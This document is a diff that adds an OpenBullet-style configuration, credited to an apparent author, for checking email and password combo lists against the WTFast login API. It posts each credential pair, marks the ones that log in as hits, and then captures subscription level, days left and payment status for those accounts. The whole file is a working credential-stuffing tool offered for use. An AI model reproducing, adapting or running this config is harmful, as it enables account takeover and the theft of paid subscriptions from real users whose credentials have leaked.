@@ -1,0 +1,56 @@
+[SETTINGS]
+{
+  "Name": "WTFast",
+  "SuggestedBots": 5,
+  "LastModified": "2018-07-30T15:23:55.5893443+00:00",
+  "AdditionalInfo": "5 bots or less",
+  "Author": "Paparazzi-Nicolas",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+FUNCTION RandomNum 0 10000000 "<RANDOM>" -> VAR "RANDOM" 
+#URL REQUEST POST "https://api.wtfast.com/api/Account/Login" AutoRedirect=TRUE 
+  CONTENT "------------fad05c1b159c4996a939b1b4e29c80bb\nContent-Disposition: form-data; name=\"Login\"\n\n<USER>\n------------fad05c1b159c4996a939b1b4e29c80bb\nContent-Disposition: form-data; name=\"Password\"\n\n<PASS>\n------------fad05c1b159c4996a939b1b4e29c80bb\nContent-Disposition: form-data; name=\"ClientCode\"\n\n<RANDOM>\n------------fad05c1b159c4996a939b1b4e29c80bb--\n" 
+  CONTENTTYPE "multipart/form-data; boundary=----------fad05c1b159c4996a939b1b4e29c80bb" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER ": " 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY ">Incorrect login or password</" 
+    KEY "Your password has expired" 
+  KEYCHAIN Success OR 
+    KEY "<SessionHash>" 
+#SessionHash PARSE "<SOURCE>" LR "><SessionHash>" "<" Recursive=FALSE -> VAR "SessionHash" "" "" 
+#URL2 REQUEST POST "https://api.wtfast.com/api/Account/GetAccountState20180618" AutoRedirect=TRUE 
+  CONTENT "-----------------------------fad05c1b159c4996a939b1b4e29c80bb\nContent-Disposition: form-data; name=\"sessionId\"\n\n<SessionHash>\n-----------------------------fad05c1b159c4996a939b1b4e29c80bb--\n" 
+  CONTENTTYPE "multipart/form-data; boundary=---------------------------fad05c1b159c4996a939b1b4e29c80bb" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#DaysLeft PARSE "<SOURCE>" LR "<DaysLeft>" "<" Recursive=FALSE -> CAP "DaysLeft" "" "" 
+#Computers PARSE "<SOURCE>" LR "Computers=\"" "\"" Recursive=FALSE -> CAP "Computers" "" "" 
+#EverPaid PARSE "<SOURCE>" LR "EverPaid=\"" "\"" Recursive=FALSE -> CAP "EverPaid" "" "" 
+#SubscribeUI PARSE "<SOURCE>" LR "ShowSubscribeUI=\"" "\"" Recursive=FALSE -> CAP "ShowSubscribeUI" "" "" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "Level=\"Advanced" 
+    KEY "Level=\"Trial" 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "Level=\"Expired" 
